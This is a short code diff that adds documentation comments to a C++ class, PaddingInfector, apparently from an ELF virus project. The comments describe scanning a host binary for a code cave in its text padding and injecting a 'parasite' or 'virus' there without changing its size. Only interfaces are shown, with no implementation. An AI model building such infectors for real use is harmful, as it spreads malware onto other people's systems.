@@ -52,11 +52,23 @@ namespace vf::infector {
 // choice.
 class PaddingInfector {
  public:
+  // Return the size of the binary after a successful infection. Because we
+  // inject into text padding, the size of the binary will not change.
+  // @return The binary size after a successful infection.
   size_t injected_host_size() { return host_size_; }
 
+  // Scan the elf to see if it can be injected with a parasite into a code cave.
+  // @param host_mapping The host elf mapping.
+  // @param parasite_size The size of the parasite.
+  // @return True if the host binary can be injected.
   bool analyze(std::span<const std::byte> host_mapping,
                std::span<const std::byte> parasite_mapping);
 
+  // Perform the injection,
+  // @param host_mapping The host binary to be injected.
+  // @param parasite_mapping The virus.
+  // @return the injection result. std::nullopt if injection failed.
+  // Callers are responsible for memory allocation. This class is no-owning.
   std::optional<InjectionResult> inject(
       std::span<std::byte> host_mapping,
       std::span<const std::byte> parasite_mapping);
